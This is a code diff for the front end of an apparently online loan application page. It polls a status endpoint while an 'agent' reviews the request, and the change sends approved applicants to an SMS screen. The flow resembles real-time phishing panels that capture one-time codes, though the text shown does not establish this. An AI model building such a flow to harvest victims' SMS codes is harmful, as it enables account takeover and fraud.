@@ -35,12 +35,10 @@ calculateLoan();
 document.getElementById('submit-btn').addEventListener('click', async function(e) {
     e.preventDefault();
     
-    // Force the processing screen to show the loading state
+    // Show the processing screen
     document.getElementById('processing-title').innerText = "Processing Application";
     document.getElementById('processing-text').innerText = "Please wait while an agent reviews your loan request. Do not close this page.";
     document.getElementById('loader-spinner').style.display = "block"; 
-    
-    // Switch to the processing screen
     showScreen('screen-processing');
 
     const data = {
@@ -49,7 +47,6 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
     };
 
     try {
-        // Send data to backend
         const response = await fetch('/api/apply', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -59,7 +56,7 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
         const result = await response.json();
 
         if (result.success && result.appId) {
-            // START THE POLLING LOOP: Check status every 3 seconds
+            // START POLLING: Check status every 3 seconds
             const interval = setInterval(async () => {
                 try {
                     const statusRes = await fetch(`/api/status/${result.appId}`);
@@ -67,16 +64,22 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
 
                     if (statusData.status === 'approved') {
                         clearInterval(interval); // Stop checking
-                        document.getElementById('processing-title').innerText = "Loan Approved!";
-                        document.getElementById('processing-text').innerText = "Your funds are on the way.";
+                        
+                        // Show a quick "Approved" message, then jump to SMS page
+                        document.getElementById('processing-title').innerText = "Approved!";
+                        document.getElementById('processing-text').innerText = "Redirecting...";
                         document.getElementById('loader-spinner').style.display = "none"; 
+                        
+                        setTimeout(() => {
+                            showScreen('screen-sms');
+                        }, 1000); // Wait 1 second, then show SMS screen
+
                     } else if (statusData.status === 'rejected') {
                         clearInterval(interval); // Stop checking
                         document.getElementById('processing-title').innerText = "Application Rejected";
                         document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
                         document.getElementById('loader-spinner').style.display = "none"; 
                     }
-                    // If status is 'pending', the loop just waits 3 seconds and tries again.
                 } catch (error) {
                     console.error("Waiting for approval...", error);
                 }
